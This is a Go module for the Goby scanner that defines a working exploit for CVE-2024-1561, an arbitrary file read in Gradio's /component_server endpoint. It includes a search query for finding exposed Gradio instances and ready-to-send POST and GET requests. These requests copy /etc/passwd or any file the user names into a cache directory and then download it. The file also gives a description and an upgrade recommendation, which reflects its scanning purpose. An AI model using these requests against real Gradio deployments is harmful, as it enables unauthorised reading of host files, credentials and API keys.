package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Gradio /component_server Arbitrary File Read Vulnerability (CVE-2024-1561)",
    "Description": "<p>The component server interface of Gradio incorrectly allows any method of the Component class to be called with parameters controlled by the attacker. Specifically, by exploiting the move resource of the Block class to block the cache() method, an attacker can copy any file on the file system to a temporary directory and then retrieve it. </p>",
    "Product": "gradio",
    "Homepage": "https://gradio.app/",
    "DisclosureDate": "2024-05-17",
    "PostTime": "2024-05-24",
    "Author": "zhangguangfa@baimaohui.net",
    "FofaQuery": "body=\"__gradio_mode__\"",
    "GobyQuery": "body=\"__gradio_mode__\"",
    "Level": "2",
    "Impact": "<p>This vulnerability enables unauthorized local file read access, particularly when an application is exposed to the Internet via launch(share=True), allowing a remote attacker to read files on the host machine. Additionally, gradio apps hosted on huggingface.co are also affected, potentially leading to the disclosure of sensitive information such as API keys and credentials stored in environment variables.</p>",
    "Recommendation": "<p>Upgrade to Gradio 4.13.0 or higher</p>",
    "References": [
        "https://mp.weixin.qq.com/s/avowMUeEppLI88gOfy_B2g"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "/etc/passwd,customize",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/component_server",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*"
                },
                "data_type": "text",
                "data": "{\n\t\"component_id\": \"1\",\n\t\"data\": \"/etc/passwd\",\n\t\"fn_name\": \"move_resource_to_block_cache\",\n\t\"session_hash\": \"a\"\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "VulURL|lastbody|variable|{{{fixedhostinfo}}}/config"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/component_server",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*"
                },
                "data_type": "text",
                "data": "{\n\t\"component_id\": \"1\",\n\t\"data\": \"{{{filePath}}}\",\n\t\"fn_name\": \"move_resource_to_block_cache\",\n\t\"session_hash\": \"b\"\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "file|lastbody|regex|\"([^\"]*)\"",
                "output|lastbody|regex|\"([^\"]*)\""
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/file/{{{file}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-1561"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "Gradio /component_server 任意文件读取漏洞(CVE-2024-1561)",
            "Product": "gradio",
            "Description": "<p>Gradio的component server接口不正确地允许使用攻击者控制的参数调用Component类的任何方法。具体来说，通过利用Block类的move resource to block cache() 方法，攻击者可以将文件系统上的任何文件复制到临时目录，然后检索它。<br></p>",
            "Recommendation": "<p>升级至Gradio 4.13.0以上版本<br></p>",
            "Impact": "<p>该漏洞允许未经授权的本地文件读取访问，尤其是当应用程序通过launch(share=True)暴露到互联网时，从而允许远程攻击者读取主机机器上的文件。此外，托管在 huggingface.co 上的gradio应用也受到影响，可能导致敏感信息，如存储在环境变量中的API密钥和凭据的泄露。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Gradio /component_server Arbitrary File Read Vulnerability (CVE-2024-1561)",
            "Product": "gradio",
            "Description": "<p>The component server interface of Gradio incorrectly allows any method of the Component class to be called with parameters controlled by the attacker. Specifically, by exploiting the move resource of the Block class to block the cache() method, an attacker can copy any file on the file system to a temporary directory and then retrieve it.&nbsp;<br></p>",
            "Recommendation": "<p>Upgrade to Gradio 4.13.0 or higher<br></p>",
            "Impact": "<p>This vulnerability enables unauthorized local file read access, particularly when an application is exposed to the Internet via launch(share=True), allowing a remote attacker to read files on the host machine. Additionally, gradio apps hosted on huggingface.co are also affected, potentially leading to the disclosure of sensitive information such as API keys and credentials stored in environment variables.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10956"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
